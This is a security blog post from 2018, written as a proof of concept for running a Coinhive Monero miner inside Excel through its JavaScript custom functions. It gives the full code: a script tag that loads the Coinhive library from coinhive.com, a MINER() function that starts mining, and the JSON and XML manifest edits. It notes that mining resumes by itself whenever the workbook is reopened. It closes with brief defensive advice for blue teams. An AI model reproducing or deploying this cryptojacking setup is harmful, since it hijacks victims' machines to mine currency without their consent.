---
layout: single
title:  "JavaScript Coinhive in Excel"
date:   2018-05-08 01:29:21 -0600
categories: POC JAVASCRIPT MICROSOFT OFFICE
excerpt: This code does have persistence, if you save the XLSX sheet now and reopen it, your PC will instantly start to mine again without any user interaction.
---

## Timeline:

This morning, I read that Microsoft announced that they have added JavaScript functions into the insiders preview build of Excel.

[https://www.bleepingcomputer.com/news/microsoft/microsoft-adds-support-for-javascript-functions-in-excel/](https://www.bleepingcomputer.com/news/microsoft/microsoft-adds-support-for-javascript-functions-in-excel/)

Like most of you reading this, I couldn't wait for a POC of coin mining within Excel using the new JavaScript functions.

<blockquote class="twitter-tweet"><p lang="en" dir="ltr">I cannot wait for the first cryptocurrency miner in Excel</p>&mdash; Chase Dardaman (@CharlesDardaman) <a href="https://twitter.com/CharlesDardaman/status/993874412486176768?ref_src=twsrc%5Etfw">May 8, 2018</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

I even went as far as to offer to a small bounty to anyone at Dallas Hackers who could build and present on it at next month's meetup.

<blockquote class="twitter-tweet"><p lang="en" dir="ltr">I&#39;ll buy a beer to whoever presents cryptocurrency mining in Excel at the next <a href="https://twitter.com/Dallas_Hackers?ref_src=twsrc%5Etfw">@Dallas_Hackers</a></p>&mdash; Chase Dardaman (@CharlesDardaman) <a href="https://twitter.com/CharlesDardaman/status/993877218270105601?ref_src=twsrc%5Etfw">May 8, 2018</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

After making this offer, I started to read Microsoft's actual documentation on how to implement JS within Excel, and decided I could do this myself. I then signed up for an account on coinhive.com and started to download the preview build of Excel for macOS. After over an hour of downloading the preview on my 5mb down internet, I was able to get my hands on it and get Coinhive running within the newest preview build of Excel.

<blockquote class="twitter-tweet"><p lang="en" dir="ltr">GOT IT! <a href="https://twitter.com/hashtag/coinhive?src=hash&amp;ref_src=twsrc%5Etfw">#coinhive</a> <a href="https://twitter.com/hashtag/Excel?src=hash&amp;ref_src=twsrc%5Etfw">#Excel</a> <a href="https://twitter.com/hashtag/Microsoft?src=hash&amp;ref_src=twsrc%5Etfw">#Microsoft</a> <a href="https://twitter.com/hashtag/Malware?src=hash&amp;ref_src=twsrc%5Etfw">#Malware</a> <a href="https://t.co/QvHkgnGFkQ">pic.twitter.com/QvHkgnGFkQ</a></p>&mdash; Chase Dardaman (@CharlesDardaman) <a href="https://twitter.com/CharlesDardaman/status/993912675804614657?ref_src=twsrc%5Etfw">May 8, 2018</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>


## Proof of Concept:

In order to run Coinhive in Excel, I followed Microsoft's official documentation and just added my own function. There are three steps that Microsoft lists in order to get JS running:


1. Install Office (build 9325 on Windows or 13.329 on Mac) and join the Office Insider program. (Note that it isn't enough just to get the latest build; the feature will be disabled on any build until you join the Insider program)
2. Clone the Excel-Custom-Functions repo and follow the instructions in the README.md to start the add-in in Excel, make changes in the code, and debug.
3. Type =CONTOSO.ADD42(1,2) into any cell, and press Enter to run the custom function.

https://docs.microsoft.com/en-us/office/dev/add-ins/excel/custom-functions-overview The first step is easy, just select Insider program on the updates menu for Microsoft Office and allow it to update. This gives Excel the ability to run JS functions.

![1]({{ site.url }}/assets/js_coinhive_in_excel/1.png)

Step two is where the magic happens. Here you go Microsoft's GitHub and download the four important files:

* customfunctions.html
* customfunctions.js
* customfunctions.json
* customfunctions.xml

Once you get these files, you will need to make a couple of edits in order to add in the Coinhive features and code from their documentation. For the HTML file, you need to add the following no auth script tag into the head, so that Coinhive can be called later:

```
<script src="https://coinhive.com/lib/coinhive.min.js"></script>
```

For the JS file, add in the following function which will then be called from within the Excel cell:

```
function MINER(){
    var miner = new CoinHive.Anonymous('Your Public Coinhive Key goes here.', {throttle: 0.7});

    if (!miner.isMobile() && !miner.didOptOut(14400)) {
        miner.start();
    }
}
```

In the JSON file, we add data about our new function, MINER, so that Excel can load it.

```
        {
            "name": "MINER",
            "description": "MINER MINER",
            "helpUrl": "http://dev.office.com",
            "result": {
                "type": "number",
                "dimensionality": "scalar"
            },
            "parameters": [],
            "options": {
                "sync": false
            }
        },
```

After editing these three files, you must host them on a web server. I hosted them on a linux VM running Apache, this allowed me to easily hit the files locally.

Lastly, we edit the XML file by adding in the web server IP address.
```
...
<SourceLocation DefaultValue="http://192.168.201.140/customfunctions.html"/>
...
            <bt:Urls>
                <bt:Url id="JSON-URL" DefaultValue="http://192.168.201.140/customfunctions.json" />
                <bt:Url id="JS-URL" DefaultValue="http://192.168.201.140/customfunctions.js" />
                <bt:Url id="HTML-URL" DefaultValue="http://192.168.201.140/customfunctions.html" />
            </bt:Urls>
...
```
This XML file is the manifest file that currently must be added into Excel for JS to work. I am under the assumption that this will change by the time JS becomes fully supported in Excel, as most users will not be savvy enough to add in the functionality themselves. In order to do this on macOS, I followed documents on Microsoft's Blog, which basically tells you to copy the XML file into the following location:
```
/Users/<username>/Library/Containers/com.microsoft.Excel/Data/documents/wef/
```
With all of these files in place and hosted, you're ready for step three. Open up a new notebook in Excel, and click Insert-> My Add-ins, you should now be able to see that your new functions have been added.

![2]({{ site.url }}/assets/js_coinhive_in_excel/2.png)

Now, simply type the following into any cell on the sheet and hit enter:

```
=CONTOSO.MINER()
```

Your PC will now be mining Monero for you. This code does have persistence, if you save the XLSX sheet now and reopen it, your PC will instantly start to mine again without any user interaction.

## Summary:

Microsoft has, for some reason, decided that the business world needs yet another scripting language running within office. Currently, it takes some effort to get JS running within Excel, but I suspect that the difficultly will drop drastically as we near JS moving into the full Office build. Once that has been completed, I plan to take another look at this new attack vector.

If you are a Blue Teamer, like me, wondering how to defend against such an attack try to get in front of your IT team and have JavaScript disabled whenever it hits the full Office build. We do not currently know what controls Microsoft will put around JS use, but it will probably be better to just block it before your company becomes dependent upon it.

If you have any questions regarding this POC please hit me up on Twitter, I'll be more than happy to answer them.

